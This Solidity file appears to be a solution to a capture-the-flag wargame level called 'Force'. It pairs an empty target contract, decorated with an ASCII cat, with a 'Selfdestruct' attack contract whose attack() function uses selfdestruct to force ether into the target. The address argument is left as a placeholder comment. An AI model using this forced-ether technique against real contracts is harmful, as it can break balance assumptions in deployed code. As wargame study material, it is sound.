pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?  Give me money
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}





/* 
SOLUTION: SELF-DESTRUCT WITH THIS CONTRACT::
*/

contract Selfdestruct{
  function Selfdestruct() payable{}
  function attack(){
    selfdestruct(/* ADDRESS OF FORCE.sol */);
  }
}